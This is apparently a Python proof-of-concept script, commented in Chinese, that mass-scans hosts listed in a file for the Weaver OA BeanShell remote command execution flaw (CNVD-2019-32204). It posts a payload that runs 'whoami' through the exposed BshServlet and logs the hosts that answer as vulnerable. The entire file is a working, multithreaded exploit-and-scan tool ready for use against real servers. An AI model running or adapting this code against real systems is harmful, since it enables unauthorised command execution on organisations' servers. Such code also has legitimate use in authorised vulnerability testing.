#conding=utf-8
import requests #用于http请求响应
from requests.packages import urllib3
import threading#用于并发请求

'''
使用方法：
urls.txt用于存放目标HOST，然后直接运行此脚本即可 python POC.py
漏洞验证成功的目标存放于success.txt，连接失败的错误信息存放于error.txt中
'''

#消除安全请求的提示信息,增加重试连接次数
urllib3.disable_warnings()
requests.adapters.DEFAULT_RETRIES = 4
s = requests.session()
s.keep_alive = False    #关闭连接，防止出现最大连接数限制错误
urllib3.util.ssl_.DEFAULT_CIPHERS += 'HIGH:!DH:!aNULL'#openssl 拒绝短键，防止SSL错误

# 设置最大线程数
thread_max = threading.BoundedSemaphore(value=150)

#HTTP请求-head头
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Content-Type': 'application/x-www-form-urlencoded',
}

targets = []    #定义目标列表
threads = []    #定义线程池

def POC(url):
    target = url + '/weaver/bsh.servlet.BshServlet'
    payload = 'bsh.script=exec(%22whoami%22)&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
    try:
        resp = s.get(target,verify=False,headers=headers,timeout=8)#忽略了SSL验证
        if (resp.status_code ==200 and ("访问禁止" not in resp.text)):
            resp = s.post(url=target, verify=False, data=payload, headers=headers, timeout=8)
            resp.encoding = resp.apparent_encoding  #指定编码，防止乱码
            #apparent_encoding会从网页的内容中分析网页编码的方式
            rs_len = len(resp.text)
            if rs_len < 50:
                success = "[CNVD-2019-32204]泛微OA远程命令执行漏洞"+url+" "+resp.text
                print(success)
                with open('success.txt','a') as f:
                    f.write(success+'\n')
                resp.close() #关闭响应包
            else:
                resp.close() #关闭响应包              
        else:
            pass
            #print(url+"===>不存在漏洞！")

    except Exception as ex_poc:
        msg = url+"=====报错了====="+str(ex_poc)
        with open('./error.txt','a') as f:
            f.write(msg+'\n')
    finally:
        thread_max.release()    #释放锁


def H2U():
    '''输入格式处理，将HOST统一为URL格式'''
    with open('urls.txt','r',encoding='utf-8') as f:
        line=f.readlines()
        for host in line:
            host=host.strip()
            if(host[0:4]=="http"):
                url=host
            else:
                url="http://"+host
            if url not in targets:
                targets.append(url) #去重后加入目标列表


if __name__ == "__main__":
    H2U()
    for url in targets:
        thread_max.acquire()    #请求锁
        t = threading.Thread(target=POC,args=(url,))
        threads.append(t)
        t.start()
    for i in threads:
        i.join()
